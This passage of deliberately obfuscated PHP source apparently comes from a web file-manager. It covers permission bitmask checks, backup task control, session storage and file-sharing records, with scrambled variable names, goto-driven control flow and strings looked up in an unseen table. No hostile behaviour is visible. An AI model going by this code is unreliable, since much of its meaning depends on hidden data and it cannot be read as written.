!!($cÛÛ÷ëò– & $aŸ†öš©Éù); } public static function authCheckShow($EĞÎÃ¶âŸš) { return self::authCheck($EĞÎÃ¶âŸš, self::AUTH_SHOW); } public static function authCheckView($Ağ¥¸ãÊî¾) { return self::authCheck($Ağ¥¸ãÊî¾, self::AUTH_VIEW); } public static function authCheckDownload($bÏÀˆÒ–„²) { return self::authCheck($bÏÀˆÒ–„², self::AUTH_DOWNLOAD); } public static function authCheckUpload($cšŒŠƒçˆ) { return self::authCheck($cšŒŠƒçˆ, self::AUTH_UPLOAD); } public static function authCheckEdit($B¡×Ç¥˜‘Ù) { return self::authCheck($B¡×Ç¥˜‘Ù, self::AUTH_EDIT); } public static function authCheckRemove($açåô­¶ª) { return self::authCheck($açåô­¶ª, self::AUTH_REMOVE); } public static function authCheckShare($CøŞ©óö‘”) { return self::authCheck($CøŞ©óö‘”, self::AUTH_SHARE); } public static function authCheckComment($EãæÈé«æó) { return self::authCheck($EãæÈé«æó, self::AUTH_COMMENT); } public static function authCheckEvent($có‘”´±ù) { return self::authCheck($có‘”´±ù, self::AUTH_EVENT); } public static function authCheckRoot($Eğ‚ÇæÛœÀ) { return self::authCheck($Eğ‚ÇæÛœÀ, self::AUTH_ROOT); } public static function authCheckAction($a³İÚÀáœ, $aÂ¦™ºŸ¨ß) { goto F‡èø»è´Ì; cŸ—ø‰Š: $b¾©“ß½É½ = $aÌÒğ‘øœ›[$aÂ¦™ºŸ¨ß]; $a³İÚÀáœ = intval($a³İÚÀáœ); if ($a³İÚÀáœ <= 0) { return !1; } goto fÈŸ²Òê»; F‡èø»è´Ì: $F¡à‘À×ñ¿ =& $_SERVER[Šº]; $aÌÒğ‘øœ› = array($F¡à‘À×ñ¿[1696] => self::AUTH_VIEW, $F¡à‘À×ñ¿[1082] => self::AUTH_DOWNLOAD, $F¡à‘À×ñ¿[107] => self::AUTH_UPLOAD, $F¡à‘À×ñ¿[1644] => self::AUTH_EDIT, $F¡à‘À×ñ¿[1643] => self::AUTH_REMOVE, $F¡à‘À×ñ¿[1654] => self::AUTH_SHARE, $F¡à‘À×ñ¿[351] => self::AUTH_COMMENT, $F¡à‘À×ñ¿[1503] => self::AUTH_EVENT, $F¡à‘À×ñ¿[1697] => self::AUTH_ROOT); if (!isset($aÌÒğ‘øœ›[$aÂ¦™ºŸ¨ß])) { return; } goto cŸ—ø‰Š; fÈŸ²Òê»: if (($a³İÚÀáœ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($a³İÚÀáœ & $b¾©“ß½É½); goto E¾å¤šŠñö; E¾å¤šŠñö: } public static function authDisable($cª—¤ˆ¾Ø, $e„òæ¨·§İ) { if (intval($cª—¤ˆ¾Ø) <= 0) { return 0; } return intval($cª—¤ˆ¾Ø) & ~$e„òæ¨·§İ; } public $optionType = "\123\171\163\164\x65\x6d\x2e\x73\x6f\x75\162\143\145\x41\165\x74\150\114\x69\x73\164"; public $field = array("\156\x61\155\x65", "\x61\165\164\x68", "\x6c\141\142\145\x6c", "\x64\151\163\x70\154\x61\171", "\163\171\x73\164\145\x6d", "\x73\x6f\162\164"); public function initData() { $cÅ…æÉœ‰ = $this->authDefault(); foreach ($cÅ…æÉœ‰ as $D‡¦ù®äÛ–) { $this->add($D‡¦ù®äÛ–); } } public function listData($cïÚÔ±ÚÙ¾ = false, $c’œ¥É¢ö¶ = "\163\157\x72\x74", $fˆÙ¹Ü‰Œß = false) { return parent::listData($cïÚÔ±ÚÙ¾, $c’œ¥É¢ö¶, $fˆÙ¹Ü‰Œß); } public function update($Cƒ––Ş‡éê, $E„É·éİ»±) { $a…š¦¬›Ñ  =& $_SERVER[Šº]; $bÉ¦§èáõŒ = parent::listData($Cƒ––Ş‡éê); $bÉçº‹ô» = $this->findByName($E„É·éİ»±[$a…š¦¬›Ñ [28]]); if (!$bÉ¦§èáõŒ || $bÉçº‹ô» && $bÉçº‹ô»[$a…š¦¬›Ñ [392]] != $bÉ¦§èáõŒ[$a…š¦¬›Ñ [392]]) { return !1; } $this->filterAuth($E„É·éİ»±[$a…š¦¬›Ñ [413]]); return parent::update($Cƒ––Ş‡éê, $E„É·éİ»±); } public function remove($dÅ¾‘ù»¨Î) { $DÍø£ìÃùë = parent::listData($dÅ¾‘ù»¨Î); if (!$DÍø£ìÃùë || $DÍø£ìÃùë[$_SERVER[Šº][1157]]) { return !1; } return parent::remove($dÅ¾‘ù»¨Î); } public function add($c‘¹¤Œ‡ = array()) { goto Bè£ˆšÆãÌ; Bè£ˆšÆãÌ: $BÜ»ø‚™¾ =& $_SERVER[Šº]; if ($this->findByName($c‘¹¤Œ‡[$BÜ»ø‚™¾[28]])) { return !1; } $cĞô­â¡–è = array($BÜ»ø‚™¾[28] => $BÜ»ø‚™¾[33], $BÜ»ø‚™¾[413] => 1, $BÜ»ø‚™¾[1698] => $BÜ»ø‚™¾[1687], $BÜ»ø‚™¾[1699] => 1, $BÜ»ø‚™¾[1157] => 0, $BÜ»ø‚™¾[1700] => 0); goto aó–£›Æ’›; bÑ±ÅŠ´–: return parent::insert($c‘¹¤Œ‡); goto Dš¥¸’Ôê; aó–£›Æ’›: $c‘¹¤Œ‡ = array_merge($cĞô­â¡–è, $c‘¹¤Œ‡); $c‘¹¤Œ‡[$BÜ»ø‚™¾[1700]] = $this->getSort(); $this->filterAuth($c‘¹¤Œ‡[$BÜ»ø‚™¾[413]]); goto bÑ±ÅŠ´–; Dš¥¸’Ôê: } private function getSort() { $bÑÒ½˜­Ó˜ =& $_SERVER[Šº]; $CÒÁ¥È÷æÁ = parent::listData(); $A Œ¾Øåº = array_to_keyvalue($CÒÁ¥È÷æÁ, $bÑÒ½˜­Ó˜[33], $bÑÒ½˜­Ó˜[1700]); return empty($A Œ¾Øåº) ? 0 : max($A Œ¾Øåº) + 1; } private function filterAuth(&$EÒ½ÃÒÂ¶) { goto c¦‹ÒÜ¯; E¡˜åø÷ÃÀ: foreach ($EÊæ½·Œ¯¡ as $bğ¡¢ğÁ—…) { if (isset($BœõòÓñªô[$bğ¡¢ğÁ—…])) { $EÊæ½·Œ¯¡ = array_merge($EÊæ½·Œ¯¡, $BœõòÓñªô[$bğ¡¢ğÁ—…]); } } $EÊæ½·Œ¯¡[] = self::AUTH_SHOW; $EÒ½ÃÒÂ¶ = array_sum(array_unique($EÊæ½·Œ¯¡)); goto EøÅø»àŞš; Dß÷×­‰ğ–: foreach ($AˆÀ’ê½Ê as $bğ¡¢ğÁ—…) { if ($EÒ½ÃÒÂ¶ & $bğ¡¢ğÁ—…) { $EÊæ½·Œ¯¡[] = $bğ¡¢ğÁ—…; } } if (in_array(self::AUTH_ROOT, $EÊæ½·Œ¯¡)) { $EÒ½ÃÒÂ¶ = array_sum($AˆÀ’ê½Ê); return; } $BœõòÓñªô = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto E¡˜åø÷ÃÀ; c¦‹ÒÜ¯: if (!$EÒ½ÃÒÂ¶) { return; } $AˆÀ’ê½Ê = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EÊæ½·Œ¯¡ = array(); goto Dß÷×­‰ğ–; EøÅø»àŞš: } public function sort($bÄ½ö²·¢‘, $C‚¬Û¤Ø³‘) { return parent::update($bÄ½ö²·¢‘, $C‚¬Û¤Ø³‘); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x62\x61\x63\153\x75\160\x4c\x69\163\164"; public $field = array("\151\157", "\x6e\x61\x6d\x65", "\x73\x74\141\x74\x75\163", "\x63\157\156\164\x65\x6e\x74", "\x72\x65\163\165\154\x74", "\164\151\x6d\x65\x46\162\x6f\155", "\164\151\155\x65\124\x6f"); public function config() { goto C†“‚óµˆ; c¿ø¶œ¡£ô: Action($DÑ†ì¼ŠŸ¢[1701])->taskInit(); $C¯Î…Ù›‹è = Model($DÑ†ì¼ŠŸ¢[1702])->listData(); foreach ($C¯Î…Ù›‹è as $a‹×‹Ãï) { if ($a‹×‹Ãï[$DÑ†ì¼ŠŸ¢[1157]] == $DÑ†ì¼ŠŸ¢[87] && $a‹×‹Ãï[$DÑ†ì¼ŠŸ¢[1503]] == $DÑ†ì¼ŠŸ¢[1703]) { $Dóˆ¢“Œ¥Í = $a‹×‹Ãï; break; } } goto eÈ¦ÒÅª…; aĞƒ¥Ì¹²Ú: $CÑãè»‡¡ù = is_array($CÑãè»‡¡ù) ? $CÑãè»‡¡ù : array(); if (!isset($CÑãè»‡¡ù[$DÑ†ì¼ŠŸ¢[714]])) { $CÑãè»‡¡ù[$DÑ†ì¼ŠŸ¢[714]] = $DÑ†ì¼ŠŸ¢[87]; } $Dóˆ¢“Œ¥Í = array(); goto c¿ø¶œ¡£ô; eÈ¦ÒÅª…: if (isset($Dóˆ¢“Œ¥Í[$DÑ†ì¼ŠŸ¢[196]])) { $Dóˆ¢“Œ¥Í[$DÑ†ì¼ŠŸ¢[196]] = json_decode($Dóˆ¢“Œ¥Í[$DÑ†ì¼ŠŸ¢[196]], !0); } if (isset($CÑãè»‡¡ù[$DÑ†ì¼ŠŸ¢[196]])) { $Dóˆ¢“Œ¥Í[$DÑ†ì¼ŠŸ¢[196]][$DÑ†ì¼ŠŸ¢[1488]] = $CÑãè»‡¡ù[$DÑ†ì¼ŠŸ¢[196]]; unset($CÑãè»‡¡ù[$DÑ†ì¼ŠŸ¢[196]]); } return array_merge($Dóˆ¢“Œ¥Í, $CÑãè»‡¡ù); goto A´›ˆ¨…ê; C†“‚óµˆ: $DÑ†ì¼ŠŸ¢ =& $_SERVER[Šº]; $CÑãè»‡¡ù = Model($DÑ†ì¼ŠŸ¢[728])->get($DÑ†ì¼ŠŸ¢[740]); $CÑãè»‡¡ù = json_decode($CÑãè»‡¡ù, !0); goto aĞƒ¥Ì¹²Ú; A´›ˆ¨…ê: } public function listData($bÍŠÔ÷´ª = false, $F²»¿’µ¡† = "\155\x6f\144\151\x66\171\x54\x69\x6d\x65", $F±†®Ş÷‹¢ = false) { return parent::listData($bÍŠÔ÷´ª, $F²»¿’µ¡†, !0); } public function lastItem() { $e…šÂêŠÇİ = $this->listData(); return !empty($e…šÂêŠÇİ[0]) ? $e…šÂêŠÇİ[0] : null; } public function kill($D„è½Ìİ) { goto FÉ™ã¸ÏÓ¹; b©ÏÌÂİ‹: Task::kill($dĞ†­í¥Öó[739]); Task::kill($dĞ†­í¥Öó[762]); Task::kill($dĞ†­í¥Öó[772]); goto aÚ“«…»Ï; D‚´§¥ğ: return $this->remove($D„è½Ìİ); goto FÙŠÜ¹Ù—ù; aÚ“«…»Ï: $C¥¨†âîã = $BŒ£÷Ô‰†Ô[$dĞ†­í¥Öó[28]]; $DëˆŠÏì˜ã = TEMP_FILES . $dĞ†­í¥Öó[736] . $C¥¨†âîã . $dĞ†­í¥Öó[8]; IO::remove($DëˆŠÏì˜ã, !1); goto D‚´§¥ğ; FÉ™ã¸ÏÓ¹: $dĞ†­í¥Öó =& $_SERVER[Šº]; $BŒ£÷Ô‰†Ô = $this->listData($D„è½Ìİ); if (!$BŒ£÷Ô‰†Ô || empty($BŒ£÷Ô‰†Ô[$dĞ†­í¥Öó[28]])) { return !0; } goto b©ÏÌÂİ‹; FÙŠÜ¹Ù—ù: } public function remove($b†ãÑÔ‹åñ) { $E’„ô±éÉ = $this->listData($b†ãÑÔ‹åñ); if (!$E’„ô±éÉ) { return !0; } return $this->backupRemove($E’„ô±éÉ); } private function backupRemove($DÒÂÌ­ä§å) { parent::remove($DÒÂÌ­ä§å[$_SERVER[Šº][392]]); $bË‰Œ—²é = $this->backupPath($DÒÂÌ­ä§å); IO::remove($bË‰Œ—²é, !1); return !0; } private function backupPath($eÄ˜¥ÍÆÙĞ) { $C°¢˜â«é‡ =& $_SERVER[Šº]; $E ïéÍƒÎ† = $eÄ˜¥ÍÆÙĞ[$C°¢˜â«é‡[28]]; $b÷Ü¾±‘á˜ = Model($C°¢˜â«é‡[728])->get($C°¢˜â«é‡[729]); $Cé’¬»› = substr(md5($C°¢˜â«é‡[730] . $b÷Ü¾±‘á˜ . $E ïéÍƒÎ†), 0, 8); return "\173\151\x6f\x3a{$eÄ˜¥ÍÆÙĞ[$C°¢˜â«é‡[713]]}\x7d\57\144\141\x74\141\x62\141\163\145\x2f\142\141\143\x6b\165\160\57" . $E ïéÍƒÎ† . $C°¢˜â«é‡[71] . $Cé’¬»›; } public function start() { goto fß†Š¸Û©; dÑÔ”á‚›Ó: $F‰íöŞ„šè = new Backup(); $F‰íöŞ„šè->keep(); $e˜Û‰¤šùÏ = $F‰íöŞ„šè->db(); goto fÖ©ôƒÊíÒ; fß†Š¸Û©: $eª…ÛØæß =& $_SERVER[Šº]; if ($GLOBALS[$eª…ÛØæß[6]][$eª…ÛØæß[88]][$eª…ÛØæß[1704]] != $eª…ÛØæß[87]) { return !0; } $E»Û“”¤Ï = $this->config(); goto AÈÓñíË ä; AÈÓñíË ä: if (!$E»Û“”¤Ï || $E»Û“”¤Ï[$eª…ÛØæß[1485]] != $eª…ÛØæß[87]) { return !1; } $cˆŠèÁÎ…Å = $this->process(); foreach ($cˆŠèÁÎ…Å as $B¢é‹Œ„‘Õ) { if ($B¢é‹Œ„‘Õ) { return Task::restart($B¢é‹Œ„‘Õ[$eª…ÛØæß[392]]); } } goto dÑÔ”á‚›Ó; fÖ©ôƒÊíÒ: if ($e˜Û‰¤šùÏ) { $e˜Û‰¤šùÏ = $F‰íöŞ„šè->dbFile(); if ($e˜Û‰¤šùÏ && $E»Û“”¤Ï[$eª…ÛØæß[714]] == $eª…ÛØæß[504]) { $e˜Û‰¤šùÏ = $F‰íöŞ„šè->file(); } } Backup::set(array($eª…ÛØæß[711] => 1, $eª…ÛØæß[483] => time())); return !0; goto DµÇ­Í„ó«; DµÇ­Í„ó«: } public function process() { $cö¾ïæã® =& $_SERVER[Šº]; return array($cö¾ïæã®[716] => Task::get($cö¾ïæã®[739]), $cö¾ïæã®[720] => Task::get($cö¾ïæã®[762]), $cö¾ïæã®[192] => Task::get($cö¾ïæã®[772])); } public function restore() { $EåÕà÷ÃáÙ =& $_SERVER[Šº]; ActionCall($EåÕà÷ÃáÙ[1006], !0, 1); ActionCall($EåÕà÷ÃáÙ[1006], !0, 0); } } goto f•§è«†õ; BÛÒÙÅòÖŸ: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\x6d\137\x73\x65\x73\x73\151\x6f\156"; public function get($b„…Ç—“ë) { $a†ó²‘³  =& $_SERVER[Šº]; $bñÌğ‹‰ = $this->where(array($a†ó²‘³ [1801] => $b„…Ç—“ë))->find(); if (!is_array($bñÌğ‹‰)) { return !1; } return $bñÌğ‹‰[$a†ó²‘³ [714]]; } public function set($B…Ô‡ÖÒ, $A²°ÓßåÊõ, $bÀóÙÕçÕÚ = 3600) { $b²ÔÂ‰Š˜¯ =& $_SERVER[Šº]; $BÏ­åöğ¦İ = array($b²ÔÂ‰Š˜¯[1801] => $B…Ô‡ÖÒ, $b²ÔÂ‰Š˜¯[1710] => $A²°ÓßåÊõ, $b²ÔÂ‰Š˜¯[1802] => $bÀóÙÕçÕÚ + time()); if (Session::get($b²ÔÂ‰Š˜¯[1803])) { $BÏ­åöğ¦İ[$b²ÔÂ‰Š˜¯[1514]] = Session::get($b²ÔÂ‰Š˜¯[1803]); } else { $BÏ­åöğ¦İ[$b²ÔÂ‰Š˜¯[1514]] = 0; } if ($this->get($B…Ô‡ÖÒ)) { return $this->where(array($b²ÔÂ‰Š˜¯[1801] => $B…Ô‡ÖÒ))->save($BÏ­åöğ¦İ); } else { return $this->add($BÏ­åöğ¦İ, array(), !0); } } public function remove($AƒÏ½Æ¼Ù) { return $this->where(array($_SERVER[Šº][1801] => $AƒÏ½Æ¼Ù))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Šº][1804] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\x69\x6d\x65", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\164\54\x75\160\x64\141\x74\x65", "\x66\165\156\x63\x74\x69\157\x6e"), array("\143\162\x65\141\x74\145\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\162\x74", "\146\165\156\143\164\x69\x6f\156"), array("\x6f\160\164\x69\157\x6e\x73", '', "\x69\156\163\x65\x72\x74\x2c\x75\x70\x64\x61\x74\145\x2c\163\145\154\145\x63\164", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($cÍ‰äî‚šÏ) { $BÍ»Ì÷Š÷ =& $_SERVER[Šº]; $B³Í¸ÉÕ½ = isset($cÍ‰äî‚šÏ[0]) ? $cÍ‰äî‚šÏ[0] : !1; return array($BÍ»Ì÷Š÷[1805] => array(USER_ID, $BÍ»Ì÷Š÷[1806]), $BÍ»Ì÷Š÷[1749] => array($B³Í¸ÉÕ½, $BÍ»Ì÷Š÷[1807])); } protected function listSimple() { $f®˜ˆ›ğƒ = array($_SERVER[Šº][1514] => USER_ID); $F«â›ÄîÓå = $this->field($this->fieldList)->where($f®˜ˆ›ğƒ)->select(); return $F«â›ÄîÓå ? $F«â›ÄîÓå : array(); } protected function getInfo($E‚²öä›ÆĞ, $EäÓ¢Ùİª÷ = false) { $dÓçƒãÂ˜ =& $_SERVER[Šº]; if ($EäÓ¢Ùİª÷) { return $this->_getShareInfo(array($dÓçƒãÂ˜[475] => $E‚²öä›ÆĞ)); } $F¹Ğßœñ„³ = $this->cacheFunctionGet($dÓçƒãÂ˜[1756], $E‚²öä›ÆĞ); return $F¹Ğßœñ„³; } public function getInfoByHash($EÁ¡‡ŞöÑº) { return $this->_getShareInfo(array($_SERVER[Šº][477] => $EÁ¡‡ŞöÑº)); } public function getInfoByPath($C“†ª½…Î‘) { $BÊªë‰¤‚™ =& $_SERVER[Šº]; $AõŠË±àœ‘ = array($BÊªë‰¤‚™[1514] => USER_ID, $BÊªë‰¤‚™[403] => $C“†ª½…Î‘); return $this->_getShareInfo($AõŠË±àœ‘); } public function getInfoBySourcePath($e‚˜İÚßÑß) { $BàÕ„ï«à· =& $_SERVER[Šº]; $D¤öËÚÖçã = array($BàÕ„ï«à·[1514] => USER_ID, $BàÕ„ï«à·[1059] => $e‚˜İÚßÑß); return $this->_getShareInfo($D¤öËÚÖçã); } private function _getShareInfo($aƒ“Ö¬öœƒ) { goto c¼’µ·ÀÎ; aÏ‡·ˆÛæ: $aƒ“Ö¬öœƒ = array($F²Ş‡¿Şå§[475] => $bîŸ«–ÕÇ[$F²Ş‡¿Şå§[475]]); $fí˜™‘Ááß = $F²Ş‡¿Şå§[1808]; $c‡òÁˆâ‰ì = Model($F²Ş‡¿Şå§[572])->order($F²Ş‡¿Şå§[392])->field($fí˜™‘Ááß)->where($aƒ“Ö¬öœƒ)->select(); goto AÌº¢ËİÈĞ; c¼’µ·ÀÎ: $F²Ş‡¿Şå§ =& $_SERVER[Šº]; $bîŸ«–ÕÇ = $this->where($aƒ“Ö¬öœƒ)->find(); if (!$bîŸ«–ÕÇ) { return !1; } goto aÏ‡·ˆÛæ; AÌº¢ËİÈĞ: if ($bîŸ«–ÕÇ[$F²Ş‡¿Şå§[403]] == $F²Ş‡¿Şå§[504]) { $bîŸ«–ÕÇ[$F²Ş‡¿Şå§[85]] = IO::info($bîŸ«–ÕÇ[$F²Ş‡¿Şå§[1059]]); } else { $bîŸ«–ÕÇ[$F²Ş‡¿Şå§[85]] = Model($F²Ş‡¿Şå§[1192])->pathInfo($bîŸ«–ÕÇ[$F²Ş‡¿Şå§[403]]); } $bîŸ«–ÕÇ[$F²Ş‡¿Şå§[1809]] = $c‡òÁˆâ‰ì; return $bîŸ«–ÕÇ; goto cÂóùØä¸; cÂóùØä¸: } protected function getInfoAuth($fµ‰ƒÓ™¨ñ) { $C—ÓîÚ­ª =& $_SERVER[Šº]; $Fê­ƒ½˜÷ = $this->getInfo($fµ‰ƒÓ™¨ñ); $Fê­ƒ½˜÷[$C—ÓîÚ­ª[413]] = Model($C—ÓîÚ­ª[489])->authMake($Fê­ƒ½˜÷[$C—ÓîÚ­ª[1809]]); return $Fê­ƒ½˜÷; } protected function listData($B©˜ë³ª‚ø = null, $e±³†á®¼© = 300) { $Eƒ‡É·äò =& $_SERVER[Šº]; $F»æ·”®À = array(array($Eƒ‡É·äò[480] => array($Eƒ‡É·äò[957], 0), $Eƒ‡É·äò[482] => array($Eƒ‡É·äò[957], 0), $Eƒ‡É·äò[1810] => $Eƒ‡É·äò[1764])); if ($B©˜ë³ª‚ø == $Eƒ‡É·äò[1811]) { $F»æ·”®À = array($Eƒ‡É·äò[480] => 1); } else { if ($B©˜ë³ª‚ø == $Eƒ‡É·äò[1044]) { $F»æ·”®À = array($Eƒ‡É·äò[482] => 1); } } $F»æ·”®À[$Eƒ‡É·äò[1514]] = USER_ID; $ağÏí³ä¾² = $this->where($F»æ·”®À)->selectPage($e±³†á®¼©); return $ağÏí³ä¾²; } protected function listToMe($f’£­ã¼¨Ö = 300) { goto A•—†•Ô¼; e•‚›ùù¦°: if ($dÑ„ùˆ“Å—) { $a·ñ®Œ™½ = array(array($cºµößã®Œ[557] => SourceModel::TYPE_USER, $cºµößã®Œ[491] => USER_ID), array($cºµößã®Œ[557] => SourceModel::TYPE_GROUP, $cºµößã®Œ[491] => array($cºµößã®Œ[7], $dÑ„ùˆ“Å—)), $cºµößã®Œ[1810] => $cºµößã®Œ[1764]); } $a‰¹™Ã×î‚ = Model($cºµößã®Œ[572])->where($a·ñ®Œ™½)->selectPage($f’£­ã¼¨Ö); $cé‰ƒ¨ëù = array_to_keyvalue_group($a‰¹™Ã×î‚[$cºµößã®Œ[366]], $cºµößã®Œ[475]); goto C¬ËÓù’§Ã; A•—†•Ô¼: $cºµößã®Œ =& $_SERVER[Šº]; $dÑ„ùˆ“Å— = Model($cºµößã®Œ[1812])->userGroupParents(USER_ID); $a·ñ®Œ™½ = array($cºµößã®Œ[557] => SourceModel::TYPE_USER, $cºµößã®Œ[491] => USER_ID); goto e•‚›ùù¦°; AìîˆÏÏÁŞ: $C¥ñ×ÑÒÌ = $this->field($b„×Û­”ƒ)->where($a·ñ®Œ™½)->select(); foreach ($C¥ñ×ÑÒÌ as $a±ñ‹ºô => &$cÚ¼ÆğÅÁ•) { $cÚ¼ÆğÅÁ•[$cºµößã®Œ[1809]] = $cé‰ƒ¨ëù[$cÚ¼ÆğÅÁ•[$cºµößã®Œ[475]]]; } unset($cÚ¼ÆğÅÁ•); goto EœÔå§§ôª; C¬ËÓù’§Ã: if (!$cé‰ƒ¨ëù) { return $a‰¹™Ã×î‚; } $b„×Û­”ƒ = $cºµößã®Œ[1813]; $a·ñ®Œ™½ = array($cºµößã®Œ[475] => array($cºµößã®Œ[418], array_keys($cé‰ƒ¨ëù))); goto AìîˆÏÏÁŞ; EœÔå§§ôª: $bÑôë‡ø©™ = array($cºµößã®Œ[1814] => $C¥ñ×ÑÒÌ, $cºµößã®Œ[1815] => $a‰¹™Ã×î‚[$cºµößã®Œ[363]]); return $bÑôë‡ø©™; goto Cí¦§‘‘Û¬; Cí¦§‘‘Û¬: } protected function shareAdd($f‘ƒ‹Í·Ş­, $A¸é‘èª‚…) { $BÊùâğ¤ˆŒ =& $_SERVER[Šº]; $Ašõ£Ú¥ô¯ = $this->_addShareData($f‘ƒ‹Í·Ş­, $A¸é‘èª‚…); if (!empty($A¸é‘èª‚…[$BÊùâğ¤ˆŒ[1816]])) { $this->_shareAuthSet($Ašõ£Ú¥ô¯, $A¸é‘èª‚…[$BÊùâğ¤ˆŒ[1816]]); } $this->shareEventAdd($f‘ƒ‹Í·Ş­, $A¸é‘èª‚…, $BÊùâğ¤ˆŒ[1047]); return $Ašõ£Ú¥ô¯; } private function shareEventAdd($B¹£Ë¡‹¥, $Eò³£à¶½†, $FÇíÙêÛÃÖ = "\x61\x64\144") { goto d©ø×ËÙÇ¾; d©ø×ËÙÇ¾: $c³¶Ú…µôñ =& $_SERVER[Šº]; if (!$B¹£Ë¡‹¥ || $B¹£Ë¡‹¥ == $c³¶Ú…µôñ[504]) { return; } if ($FÇíÙêÛÃÖ == $c³¶Ú…µôñ[1047]) { if ($Eò³£à¶½†[$c³¶Ú…µôñ[480]] == $c³¶Ú…µôñ[87]) { Model($c³¶Ú…µôñ[541])->eventShare($B¹£Ë¡‹¥, $c³¶Ú…µôñ[1817]); } if ($Eò³£à¶½†[$c³¶Ú…µôñ[482]] == $c³¶Ú…µôñ[87]) { Model($c³¶Ú…µôñ[541])->eventShare($B¹£Ë¡‹¥, $c³¶Ú…µôñ[1818]); } return; } goto fñŒÌÉ Ó‡; eÛåÜùˆÛä: Model($c³¶Ú…µôñ[541])->eventShare($B¹£Ë¡‹¥, $B„œí”¡¶ß); return; goto bèà´ö¨íË; fñŒÌÉ Ó‡: $aÂêÈ¸ = $this->getInfoByPath($B¹£Ë¡‹¥); $B„œí”¡¶ß = $c³¶Ú…µôñ[1819]; if ($aÂêÈ¸[$c³¶Ú…µôñ[480]] == $c³¶Ú…µôñ[504] && $Eò³£à¶½†[$c³¶Ú…µôñ[480]] == $c³¶Ú…µôñ[87]) { $B„œí”¡¶ß = $c³¶Ú…µôñ[1817]; } goto D ÖÍï±á; D ÖÍï±á: if ($aÂêÈ¸[$c³¶Ú…µôñ[480]] == $c³¶Ú…µôñ[87] && $Eò³£à¶½†[$c³¶Ú…µôñ[480]] == $c³¶Ú…µôñ[504]) { $B„œí”¡¶ß = $c³¶Ú…µôñ[1820]; } if ($aÂêÈ¸[$c³¶Ú…µôñ[482]] == $c³¶Ú…µôñ[504] && $Eò³£à¶½†[$c³¶Ú…µôñ[482]] == $c³¶Ú…µôñ[87]) { $B„œí”¡¶ß = $c³¶Ú…µôñ[1818]; } if ($aÂêÈ¸[$c³¶Ú…µôñ[482]] == $c³¶Ú…µôñ[87] && $Eò³£à¶½†[$c³¶Ú…µôñ[482]] == $c³¶Ú…µôñ[504]) { $B„œí”¡¶ß = $c³¶Ú…µôñ[1821]; } goto eÛåÜùˆÛä; bèà´ö¨íË: } private function _addShareData($f··ù´, $Bâ¯¢åĞË = array()) { goto fããŠ¬Ï—ì; cî×©› İ‘: $c†íÓ­ø§” = $this->add($e¿óËß³£¤); $eñöÄ‰½ßô = array($B¥¾„­­…[477] => short_id($c†íÓ­ø§”)); $this->where(array($B¥¾„­­…[474] => $c†íÓ­ø§”))->save($eñöÄ‰½ßô); goto c“Ñº­ºÓÛ; fããŠ¬Ï—ì: $B¥¾„­­… =& $_SERVER[Šº]; $eù÷ÑÌ‰¿÷ = array($B¥¾„­­…[417] => $f··ù´, $B¥¾„­­…[1506] => USER_ID); if ($f··ù´ == 0) { $eù÷ÑÌ‰¿÷ = array($B¥¾„­­…[1822] => $Bâ¯¢åĞË[$B¥¾„­­…[1059]], $B¥¾„­­…[1506] => USER_ID); } goto e·‰˜„‹µ; BÒ¨ç¡Š•÷: $e¿óËß³£¤ = array($B¥¾„­­…[1506] => USER_ID, $B¥¾„­­…[417] => $f··ù´, $B¥¾„­­…[1420] => $B¥¾„­­…[33], $B¥¾„­­…[480] => 0, $B¥¾„­­…[482] => 0, $B¥¾„­­…[1059] => $B¥¾„­­…[33], $B¥¾„­­…[304] => $B¥¾„­­…[33], $B¥¾„­­…[837] => $B¥¾„­­…[33], $B¥¾„­­…[1823] => 0, $B¥¾„­­…[1824] => 0, $B¥¾„­­…[483] => 0, $B¥¾„­­…[484] => $B¥¾„­­…[33], $B¥¾„­­…[477] => $B¥¾„­­…[33]); $bÈÍ¨ğ”ùé = explode($B¥¾„­­…[47], $B¥¾„­­…[1825]); foreach ($bÈÍ¨ğ”ùé as $D–‚…£ëÂˆ) { if (!isset($Bâ¯¢åĞË[$D–‚…£ëÂˆ])) { continue; } $e¿óËß³£¤[$D–‚…£ëÂˆ] = $Bâ¯¢åĞË[$D–‚…£ëÂˆ]; } goto cî×©› İ‘; e·‰˜„‹µ: if ($Cº½…¼†Û = $this->where($eù÷ÑÌ‰¿÷)->find()) { return $Cº½…¼†Û[$B¥¾„­­…[475]]; } if ($f··ù´ == 0) { $F…˜—ÒÅŸ = array($B¥¾„­­…[28] => get_path_this($Bâ¯¢åĞË[$B¥¾„­­…[76]])); } else { $F…˜—ÒÅŸ = Model($B¥¾„­­…[788])->sourceInfo($f··ù´); if (!$F…˜—ÒÅŸ) { return !1; } } if (!$Bâ¯¢åĞË[$B¥¾„­­…[1420]]) { $Bâ¯¢åĞË[$B¥¾„­­…[1420]] = $F…˜—ÒÅŸ[$B¥¾„­­…[28]]; } goto BÒ¨ç¡Š•÷; c“Ñº­ºÓÛ: return $c†íÓ­ø§”; goto FØŞĞ¸à; FØŞĞ¸à: } private function _shareAuthSet($DïÕööÆ‹è, $cİÖ´´¶) { goto B‚µ¼¾É; F„ÓñÁìç: $d¦ÆƒÙ¶¿->where(array($e–³œ“ Ç¦[475] => $DïÕööÆ‹è))->delete(); $F„ˆÂˆ¸— = array(); foreach ($cİÖ´´¶ as $CŒ³‹Ù“ÖÉ) { $DØƒÖ•™Â† = SourceModel::TYPE_USER; if ($CŒ³‹Ù“ÖÉ[$e–³œ“ Ç¦[411]] == SourceModel::TYPE_GROUP) { $DØƒÖ•™Â† 